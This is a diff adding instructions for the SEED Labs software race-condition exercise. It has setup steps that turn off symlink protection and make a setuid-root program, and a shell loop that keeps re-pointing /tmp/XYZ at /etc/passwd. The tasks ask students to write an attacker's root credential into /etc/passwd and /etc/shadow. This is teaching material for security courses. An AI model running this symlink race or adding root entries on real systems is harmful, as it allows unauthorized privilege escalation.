@@ -1,0 +1,73 @@
+---------------------------------------------------------------------
+Lab Description:
+http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Race_Condition/
+---------------------------------------------------------------------
+STEP 0
+  0.1.  $ su root
+        <password: seedubuntu>   
+  0.2.  $ cd /etc
+  0.3.  $ cp shadow shadow_bck   /* Backup "/etc/shadow" and "/etc/passwd" */
+  0.4.  $ cp passwd passwd_bck
+  0.5.  $ sudo sysctl -w fs.protected_symlinks=0 /* Ubuntu 16.04 */
+
+
+STEP 1
+  1.1.  Give "check_shadow.sh" and "check_passwd.sh" execution permissions.
+  1.2.  $ gcc -o vulp vulp.c
+  1.3.  $ chown root:root ./vulp
+  1.4.  $ chmod 4755 ./vulp
+  1.5.  $ exit                    /* Go back to "seed" user */
+
+STEP 2
+  2.1.  Create a blank file named: "UserOwnerFile" and "XYZ" in "/tmp" folder
+
+----------------
+| EXPLAINATION |
+----------------
+  The lab will consist of 3 components executed in three different terminals
+
+   ----->>>------    -------->>>--------    -------->>>-------
+   | "passwd"   |    |  "./vulp" loop  |    |  "Attack" loop |
+   | loop (A)   |    |       (C)       |    |       (B)      |
+   -----<<<------    --------<<<--------    --------<<<-------
+  
+  (A): "passwd" loop will check whether "passwd"/"shadow" file is changed or not.
+  (C): "./vulp" loop will repeatedly try to write the supplied string to "/tmp/XYZ".
+  (B): "Attack" loop will repeatedly try to link and unlink "/tmp/XYZ" to "/etc/passwd".
+
+  Ideally, you should have 3 open terminals and running the following "code" for each terminal respectively.
+  Note: If you copy code of Terminal (B) and (C) and paste into the terminals, they will not work. Think about how to make them work. Hint: Use "sh -c".
+
+***********************************
+*** Terminal (A): "passwd" loop ***
+  $ check_passwd.sh
+***********************************
+
+***********************************
+*** Terminal (B): "Attack" loop ***
+  sudo while [ -e attacking ] do
+      ln -s   /tmp/UserOwnerFile    /tmp/XYZ
+      rm -f   /tmp/XYZ
+      ln -s   /etc/passwd           /tmp/XYZ
+      rm -f   /tmp/XYZ
+  done
+***********************************
+
+***********************************
+*** Terminal (C): "./vulp" loop ***
+  while [ -e attacking ] do
+   ./vulp < input;
+  done
+***********************************
+
+-----------------
+| Turn in Tasks |
+-----------------
+  T1.  Exploit "vulp.c" program and use it to write to the "/etc/passwd" file the credential of an attacker with root privilege.
+  
+  T2.  Exploit the "vulp.c" program and use it to write to the "/etc/shadow" file the credential of an attacker with root privilege.
+  Note: - Some trials might no be sucessuful at the first place.
+        - Try to increase DELAY to make this happen.
+        - What is the smallest value for DELAY that you can success?
+  
+  T3. What can you do without "sudo" at Terminal #2 ??
